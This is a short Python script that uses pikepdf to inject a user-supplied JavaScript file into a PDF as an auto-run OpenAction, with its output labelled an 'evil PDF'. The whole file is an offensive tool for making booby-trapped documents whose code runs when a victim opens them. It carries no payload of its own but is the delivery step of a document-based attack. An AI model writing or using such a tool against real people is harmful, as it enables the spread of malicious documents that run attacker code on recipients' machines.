import pikepdf
import argparse

#i am super pro codes just as in my name prolokmn



def inject_js(input_pdf, output_pdf, js_code_path):
    with open(js_code_path, 'r', encoding='utf-8') as js_file:
        js_code = js_file.read()

    with pikepdf.Pdf.open(input_pdf) as pdf:
        js_dict = pdf.make_indirect({
            '/S': pikepdf.Name('/JavaScript'),
            '/JS': pikepdf.String(js_code)
        })

        pdf.Root['/OpenAction'] = js_dict
        pdf.save(output_pdf)
        print(f"[+] JavaScript injected successfully into {output_pdf}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Inject JavaScript into a PDF.")
    parser.add_argument("-f", required=True, help="Input template PDF")
    parser.add_argument("-o", required=True, help="Output evil PDF")
    parser.add_argument("-c", required=True, help="Path to JavaScript file") 
    args = parser.parse_args()

    inject_js(args.f, args.o, args.c)
